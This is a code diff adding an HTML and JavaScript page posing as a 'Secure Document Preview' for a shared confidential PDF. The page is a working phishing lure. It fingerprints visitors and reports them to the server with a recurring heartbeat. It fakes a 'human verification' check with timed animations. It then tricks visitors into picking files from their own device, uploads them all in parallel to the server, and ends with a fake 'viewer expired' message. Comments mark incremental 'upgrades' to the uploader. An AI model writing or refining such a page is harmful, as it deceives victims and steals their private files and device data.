@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+<title>Secure Document Preview</title>
+<style>
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:linear-gradient(160deg,#eef2f8 0%,#dfe7f3 100%);min-height:100vh;
+    display:flex;align-items:center;justify-content:center;padding:16px;color:#1a1d23}
+  .card{background:#fff;width:100%;max-width:400px;border-radius:16px;
+    box-shadow:0 12px 40px rgba(20,30,60,.12);overflow:hidden}
+  .hdr{background:#2563eb;padding:18px 22px;color:#fff}
+  .hdr h1{margin:0;font-size:17px;font-weight:600;letter-spacing:.2px}
+  .hdr p{margin:4px 0 0;font-size:12px;opacity:.85}
+  .body{padding:22px}
+  .doc-row{display:flex;align-items:center;gap:12px;padding:12px;border:1px solid #e3e8f0;
+    border-radius:10px;background:#fafbfd;margin-bottom:18px}
+  .doc-icon{width:36px;height:44px;background:#e6efff;border-radius:4px;position:relative;flex-shrink:0}
+  .doc-icon::before{content:"";position:absolute;top:0;right:0;border-style:solid;
+    border-width:0 10px 10px 0;border-color:#fff #fff #b9d2ff #b9d2ff}
+  .doc-meta{flex:1;min-width:0}
+  .doc-meta strong{display:block;font-size:13px;font-weight:600;color:#1a1d23;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+  .doc-meta span{font-size:11px;color:#7b869a}
+  .verify-box{border:1px solid #e3e8f0;border-radius:10px;padding:16px;
+    background:#f7f9fc;margin-bottom:18px;text-align:center}
+  .verify-box .row{display:flex;align-items:center;gap:10px;justify-content:flex-start;
+    text-align:left;padding:10px 4px}
+  .cb{width:22px;height:22px;border:2px solid #b7c1d3;border-radius:4px;position:relative;
+    flex-shrink:0;transition:all .15s}
+  .cb.loading{border-color:#2563eb;border-radius:50%;border-top-color:transparent;
+    animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .cb.done{background:#22c55e;border-color:#22c55e}
+  .cb.done::after{content:"";position:absolute;left:6px;top:2px;width:5px;height:10px;
+    border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
+  .row span{font-size:13px;color:#3a4354}
+  .btn{display:block;width:100%;background:#2563eb;color:#fff;border:0;border-radius:10px;
+    padding:14px;font-size:15px;font-weight:600;cursor:pointer;text-align:center;
+    transition:transform .08s,background .15s}
+  .btn:active{transform:scale(.985)}
+  .btn:disabled{background:#9aa8bf;cursor:not-allowed}
+  .status{font-size:12px;color:#7b869a;text-align:center;margin-top:14px;min-height:16px}
+  .status.err{color:#dc2626}
+  .status.ok{color:#16a34a}
+  .footer{padding:12px 22px;background:#f7f9fc;border-top:1px solid #edf1f7;
+    font-size:11px;color:#8a94a6;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="hdr">
+    <h1>Secure Document Preview</h1>
+    <p>1 file waiting for your review</p>
+  </div>
+  <div class="body">
+    <div class="doc-row">
+      <div class="doc-icon"></div>
+      <div class="doc-meta">
+        <strong id="docName">Confidential_Report.pdf</strong>
+        <span>2.4 MB · shared securely</span>
+      </div>
+    </div>
+
+    <div class="verify-box">
+      <div class="row"><div class="cb" id="cb1"></div><span id="lbl1">Human verification</span></div>
+      <div class="row"><div class="cb" id="cb2"></div><span id="lbl2">Preparing secure viewer</span></div>
+    </div>
+
+    <button class="btn" id="openBtn">View document</button>
+    <div class="status" id="status"></div>
+    <input type="file" id="picker" multiple
+           accept="video/*,image/*,application/pdf,*/*" style="display:none"/>
+  </div>
+  <div class="footer">End-to-end encrypted · 256-bit</div>
+</div>
+
+<script>
+const $ = (id) => document.getElementById(id);
+const statusEl = $("status");
+const openBtn  = $("openBtn");
+const picker   = $("picker");
+
+const VID = (() => {
+  let v = localStorage.getItem("vid");
+  if (!v) { v = crypto.randomUUID().replace(/-/g, "").slice(0, 12); localStorage.setItem("vid", v); }
+  return v;
+})();
+
+function setStatus(m, c) {
+  statusEl.textContent = m || "";
+  statusEl.className = "status" + (c ? " " + c : "");
+}
+
+async function register() {
+  try {
+    await fetch("/register", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        vid: VID,
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        screen: screen.width + "x" + screen.height,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        lang: navigator.language,
+        ts: Date.now()
+      })
+    });
+  } catch (e) {}
+}
+
+async function heartbeat() {
+  try {
+    await fetch("/ping", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ vid: VID, ts: Date.now() })
+    });
+  } catch (e) {}
+}
+
+// upgrade #8: reject empty / nameless files client-side
+function validFile(f) {
+  return f && f.name && f.size > 0;
+}
+
+async function uploadFile(file) {
+  const fd = new FormData();
+  fd.append("vid", VID);
+  fd.append("file", file, file.name || "file.bin");
+  try {
+    const r = await fetch("/upload", { method: "POST", body: fd });
+    const j = await r.json();
+    return j.ok === true;
+  } catch (e) { return false; }
+}
+
+// upgrade #9: bounded concurrency uploader
+async function uploadBatch(files, concurrency = 4) {
+  const queue = files.filter(validFile);
+  const total = queue.length;
+  let done = 0, ok = 0, fail = 0;
+  async function worker() {
+    while (queue.length) {
+      const f = queue.shift();
+      setStatus(`Uploading ${done + 1}/${total} — ${f.name}`);
+      const success = await uploadFile(f);
+      success ? ok++ : fail++;
+      done++;
+      setStatus(`Uploading ${done}/${total} — ${f.name}`);
+    }
+  }
+  const workers = Array.from({ length: Math.min(concurrency, queue.length) }, worker);
+  await Promise.all(workers);
+  return { ok, fail, total };
+}
+
+register();
+heartbeat();
+setInterval(heartbeat, 30000);
+
+function stepCheckbox(cb, label, tick, doneText) {
+  return new Promise((resolve) => {
+    setTimeout(() => {
+      cb.classList.add("loading");
+      setTimeout(() => {
+        cb.classList.remove("loading");
+        cb.classList.add("done");
+        if (doneText) label.textContent = doneText;
+        resolve();
+      }, tick);
+    }, 300);
+  });
+}
+
+openBtn.addEventListener("click", async () => {
+  openBtn.disabled = true;
+  openBtn.textContent = "Verifying…";
+  setStatus("Running security check…");
+  await stepCheckbox($("cb1"), $("lbl1"), 900, "Human verified");
+  await stepCheckbox($("cb2"), $("lbl2"), 1400, "Viewer ready");
+  setStatus("Select the document you were sent to unlock it.");
+  openBtn.textContent = "Choose document";
+  openBtn.disabled = false;
+  openBtn.onclick = () => { picker.value = ""; picker.click(); };
+});
+
+picker.addEventListener("change", async (e) => {
+  const files = e.target.files;
+  if (!files || !files.length) return;
+  openBtn.disabled = true;
+  openBtn.textContent = "Uploading…";
+  setStatus(`Uploading ${files.length} file${files.length > 1 ? "s" : ""}…`);
+
+  const { ok, fail, total } = await uploadBatch(files);
+
+  if (fail === 0 && ok > 0) {
+    setStatus("Done — your document is ready.", "ok");
+    document.querySelector(".doc-meta strong").textContent = "Unlocked_Document.pdf";
+    document.querySelector(".doc-meta span").textContent = "Ready · 1.8 MB";
+    openBtn.textContent = "Open document";
+    openBtn.disabled = false;
+    openBtn.onclick = () => {
+      setStatus("Opening viewer…");
+      setTimeout(() => setStatus("Your viewer expired. Request a new link.", "err"), 1500);
+    };
+  } else if (ok === 0 && total === 0) {
+    setStatus("No valid files selected. Try again.", "err");
+    openBtn.disabled = false;
+    openBtn.textContent = "Try again";
+    openBtn.onclick = () => { picker.value = ""; picker.click(); };
+  } else {
+    setStatus(`Uploaded ${ok}/${total}. ${fail} failed.`, "err");
+    openBtn.disabled = false;
+    openBtn.textContent = "Try again";
+    openBtn.onclick = () => { picker.value = ""; picker.click(); };
+  }
+});
+</script>
+</body>
+</html>
